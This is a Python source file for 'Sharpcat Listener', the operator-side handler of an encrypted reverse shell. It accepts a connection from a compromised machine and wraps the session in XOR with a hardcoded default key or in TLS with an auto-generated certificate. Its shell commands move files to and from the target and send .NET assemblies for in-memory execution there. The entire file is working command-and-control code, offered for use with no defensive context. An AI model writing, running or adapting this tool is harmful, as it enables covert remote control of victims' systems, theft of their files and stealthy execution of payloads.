#!/usr/bin/env python3
"""
Sharpcat Listener — XOR/TLS encrypted netcat listener.
Pairs with Sharpcat's encrypted reverse shell.

Usage:
    python3 listener.py [port] [key]
    python3 listener.py 4444 "Sh4rpC4tK3y!@#"

    -n flag for no encryption (plaintext mode):
    python3 listener.py -n 4444

    --tls flag for TLS-encrypted listener:
    python3 listener.py --tls 4444
    python3 listener.py --tls 4444 --cert server.pem --key server.key

    If --cert/--key not provided, a self-signed cert is auto-generated.

File transfer commands (type in the shell):
    !upload  <remote_path> <size>   → then pipe local file bytes
    !download <remote_path>         → receive file from target
    !localupload <local> <remote>   → upload local file to target

Execute-assembly (in-memory .NET assembly loading):
    !localexec <local_assembly> [args...]  → upload & execute in-memory
    !execute-assembly <size> [args...]     → raw protocol (used by !localexec)
"""

import socket
import ssl
import sys
import threading
import os
import subprocess
import tempfile


DEFAULT_PORT = 4444
DEFAULT_KEY  = b"Sh4rpC4tK3y!@#"


class XorCipher:
    def __init__(self, key: bytes):
        self.key = key
        self.send_idx = 0
        self.recv_idx = 0

    def encrypt(self, data: bytes) -> bytes:
        out = bytearray(len(data))
        for i, b in enumerate(data):
            out[i] = b ^ self.key[(self.send_idx + i) % len(self.key)]
        self.send_idx += len(data)
        return bytes(out)

    def decrypt(self, data: bytes) -> bytes:
        out = bytearray(len(data))
        for i, b in enumerate(data):
            out[i] = b ^ self.key[(self.recv_idx + i) % len(self.key)]
        self.recv_idx += len(data)
        return bytes(out)


class TlsTransport:
    """TLS transport — wraps an ssl.SSLSocket, no XOR needed."""

    def send(self, sock, data: bytes):
        sock.sendall(data)

    def recv(self, sock, size: int) -> bytes:
        return sock.recv(size)


class XorTransport:
    """XOR transport — wraps cipher encrypt/decrypt."""

    def __init__(self, cipher: XorCipher):
        self.cipher = cipher

    def send(self, sock, data: bytes):
        sock.sendall(self.cipher.encrypt(data))

    def recv(self, sock, size: int) -> bytes:
        data = sock.recv(size)
        if not data:
            return data
        return self.cipher.decrypt(data)


def recv_loop(sock, transport):
    """Receive from target, decrypt/unwrap, print to stdout."""
    try:
        while True:
            data = transport.recv(sock, 8192)
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
    except (ConnectionError, OSError, ssl.SSLError):
        pass
    print("\n[*] Connection closed.")
    os._exit(0)


def send_loop(sock, transport):
    """Read from stdin, encrypt/wrap, send to target."""
    try:
        while True:
            line = input()
            stripped = line.strip()
            if stripped.startswith("!localupload "):
                handle_local_upload(sock, transport, stripped)
                continue
            if stripped.startswith("!localexec "):
                handle_local_exec(sock, transport, stripped)
                continue

            data = (line + "\n").encode()
            transport.send(sock, data)
    except (EOFError, ConnectionError, OSError, ssl.SSLError):
        pass


def handle_local_upload(sock, transport, cmd: str):
    """
    !localupload <local_path> <remote_path>
    Reads a local file and sends the !upload command + data to target.
    """
    parts = cmd.split(maxsplit=2)
    if len(parts) < 3:
        print("[!] Usage: !localupload <local_path> <remote_path>")
        return

    local_path = parts[1]
    remote_path = parts[2]

    if not os.path.isfile(local_path):
        print(f"[!] Local file not found: {local_path}")
        return

    size = os.path.getsize(local_path)
    header = f"!upload {remote_path} {size}\n".encode()
    transport.send(sock, header)

    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            transport.send(sock, chunk)

    print(f"[+] Uploaded {size} bytes: {local_path} → {remote_path}")


def handle_local_exec(sock, transport, cmd: str):
    """
    !localexec <local_assembly_path> [arg0 arg1 ...]
    Reads a local .NET assembly, sends !execute-assembly command + raw bytes
    to the target for in-memory execution.
    """
    parts = cmd.split(maxsplit=2)
    if len(parts) < 2:
        print("[!] Usage: !localexec <local_assembly.exe> [args...]")
        return

    local_path = parts[1]
    extra_args = parts[2] if len(parts) > 2 else ""

    if not os.path.isfile(local_path):
        print(f"[!] Local file not found: {local_path}")
        return

    size = os.path.getsize(local_path)
    assembly_name = os.path.basename(local_path)

    # Build the command: !execute-assembly <size> [args...]
    header = f"!execute-assembly {size}"
    if extra_args:
        header += f" {extra_args}"
    header += "\n"

    print(f"[*] Sending {assembly_name} ({size} bytes) for in-memory execution...")
    transport.send(sock, header.encode())

    # Wait for READY response — the recv_loop thread prints it to stdout,
    # but we need to give the target time to process
    import time
    time.sleep(0.3)

    # Send the assembly bytes
    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            transport.send(sock, chunk)

    print(f"[+] Assembly sent. Output will appear below.")


def generate_self_signed_cert():
    """Generate a self-signed cert + key in temp files using openssl."""
    cert_path = os.path.join(tempfile.gettempdir(), "sharpcat_cert.pem")
    key_path = os.path.join(tempfile.gettempdir(), "sharpcat_key.pem")

    if os.path.isfile(cert_path) and os.path.isfile(key_path):
        print(f"[*] Reusing existing cert: {cert_path}")
        return cert_path, key_path

    print("[*] Generating self-signed certificate...")
    try:
        subprocess.run([
            "openssl", "req", "-x509", "-newkey", "rsa:2048",
            "-keyout", key_path, "-out", cert_path,
            "-days", "365", "-nodes",
            "-subj", "/CN=sharpcat"
        ], check=True, capture_output=True)
        print(f"[+] Certificate: {cert_path}")
        print(f"[+] Key:         {key_path}")
        return cert_path, key_path
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[!] Failed to generate cert. Install openssl or provide --cert/--key.")
        sys.exit(1)


def main():
    port = DEFAULT_PORT
    key = DEFAULT_KEY
    no_encrypt = False
    use_tls = False
    cert_file = None
    key_file = None

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == "-n":
            no_encrypt = True
        elif args[i] == "--tls":
            use_tls = True
        elif args[i] == "--cert":
            i += 1
            cert_file = args[i]
        elif args[i] == "--key":
            i += 1
            key_file = args[i]
        elif args[i].isdigit():
            port = int(args[i])
        else:
            key = args[i].encode()
        i += 1

    if no_encrypt:
        key = b"\x00"

    # ── Start listening ──────────────────────────────────────────
    print(f"[*] Listening on 0.0.0.0:{port}")

    if use_tls:
        if not cert_file or not key_file:
            cert_file, key_file = generate_self_signed_cert()
        print(f"[*] TLS mode: cert={cert_file}")
    elif not no_encrypt:
        print(f"[*] XOR key: {key.decode(errors='replace')}")
    else:
        print("[*] Encryption: OFF (plaintext)")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)

    raw_conn, addr = server.accept()
    server.close()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    if use_tls:
        # Wrap with TLS — server side
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_file, key_file)
        # Accept any client (no client cert required)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            conn = ctx.wrap_socket(raw_conn, server_side=True)
            print(f"[+] TLS handshake complete: {conn.version()}")
        except ssl.SSLError as e:
            print(f"[!] TLS handshake failed: {e}")
            raw_conn.close()
            return
        transport = TlsTransport()
    else:
        conn = raw_conn
        cipher = XorCipher(key)
        transport = XorTransport(cipher)

    t = threading.Thread(target=recv_loop, args=(conn, transport),
                         daemon=True)
    t.start()

    send_loop(conn, transport)


if __name__ == "__main__":
    main()
